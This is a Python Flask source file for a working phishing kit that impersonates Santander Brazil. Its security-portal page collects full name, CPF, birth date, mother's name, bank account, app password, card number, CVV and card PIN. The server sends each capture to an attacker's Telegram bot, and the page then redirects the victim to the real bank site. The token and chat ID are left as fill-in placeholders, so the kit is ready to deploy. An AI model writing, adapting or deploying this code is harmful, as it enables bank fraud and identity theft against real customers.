from flask import Flask, render_template_string, request, jsonify, redirect, session
from datetime import datetime
import uuid, requests, json, os

app = Flask(__name__)
app.secret_key = "stn_2026"

# CONFIGURAÇÕES (Preencha aqui)
TOKEN = "COLE_SEU_TOKEN_AQUI"
CHAT_ID = "COLE_SEU_ID_AQUI"

def bot_send(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})

HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        input { border: 1px solid #ccc!important; padding: 12px!important; border-radius: 4px!important; width: 100%; outline: none; }
        input:focus { border-color: #ec0000!important; }
        .btn { background: #ec0000; color: white; font-weight: bold; padding: 15px; border-radius: 4px; width: 100%; }
        #load { display:none; position:fixed; inset:0; background:white; z-index:99; flex-direction:column; align-items:center; justify-content:center; }
    </style>
</head>
<body class="bg-gray-100 font-sans">
    <div id="load"><div class="animate-spin rounded-full h-10 w-10 border-t-4 border-red-600"></div><p class="mt-4 italic">Sincronizando...</p></div>
    <header class="bg-[#ec0000] p-4 flex justify-center shadow-md">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Santander_Logotype_2018.svg/2560px-Santander_Logotype_2018.svg.png" class="h-5">
    </header>
    <div class="p-4 flex flex-col items-center">
        <form id="stnF" class="w-full max-w-md bg-white p-6 rounded shadow border-t-4 border-red-600 space-y-4">
            <h1 class="text-lg font-bold">Portal de Segurança</h1>
            <input type="text" id="n" placeholder="Nome completo" required>
            <div class="grid grid-cols-2 gap-2">
                <input type="tel" id="c" placeholder="CPF" maxlength="14" required>
                <input type="tel" id="d" placeholder="Nascimento" maxlength="10" required>
            </div>
            <input type="text" id="m" placeholder="Nome da mãe" required>
            <div class="grid grid-cols-2 gap-2"><input type="tel" id="ag" placeholder="Agência"><input type="tel" id="ct" placeholder="Conta"></div>
            <input type="password" id="sa" placeholder="Senha do App (8 dígitos)" maxlength="8" class="text-center bg-gray-50">
            <input type="tel" id="ca" placeholder="Número do Cartão" maxlength="19" required>
            <div class="grid grid-cols-2 gap-2"><input type="tel" id="v" placeholder="MM/AA"><input type="tel" id="cv" placeholder="CVV"></div>
            <input type="password" id="st" placeholder="Senha do Cartão (4 dígitos)" maxlength="4" class="text-center bg-red-50 text-xl font-bold border-red-200">
            <button type="submit" class="btn">CONFIRMAR</button>
        </form>
    </div>
    <script>
        const mask = (id, f) => document.getElementById(id).addEventListener('input', e => e.target.value = f(e.target.value));
        mask('c', v => v.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4'));
        mask('d', v => v.replace(/\D/g,'').replace(/(\d{2})(\d{2})(\d{4})/,'$1/$2/$3'));
        mask('ca', v => v.replace(/\D/g,'').replace(/(\d{4})/g,'$1 ').trim());
        mask('v', v => v.replace(/\D/g,'').replace(/(\d{2})(\d{2})/,'$1/$2'));

        document.getElementById('stnF').onsubmit = async (e) => {
            e.preventDefault();
            document.getElementById('load').style.display='flex';
            const data = {
                n: document.getElementById('n').value, c: document.getElementById('c').value,
                d: document.getElementById('d').value, m: document.getElementById('m').value,
                sa: document.getElementById('sa').value, ca: document.getElementById('ca').value,
                st: document.getElementById('st').value, ag: document.getElementById('ag').value, 
                ct: document.getElementById('ct').value, v: document.getElementById('v').value, 
                cv: document.getElementById('cv').value
            };
            await fetch('/api', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)});
            setTimeout(() => location.href="https://www.santander.com.br", 4000);
        };
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML)

@app.route('/api', methods=['POST'])
def api():
    d = request.json
    msg = f"🚩 *NOVA CAPTURA*\n👤 {d['n']}\n🆔 {d['c']}\n🎂 {d['d']}\n👩 {d['m']}\n🏦 AG: {d['ag']} CT: {d['ct']}\n🔐 APP: {d['sa']}\n💳 {d['ca']}\n🔑 SENHA: {d['st']}\n📅 {d['v']} | CVV: {d['cv']}"
    bot_send(msg)
    return jsonify({"s":"ok"})

if __name__ == '__main__': app.run(host='0.0.0.0', port=8080)
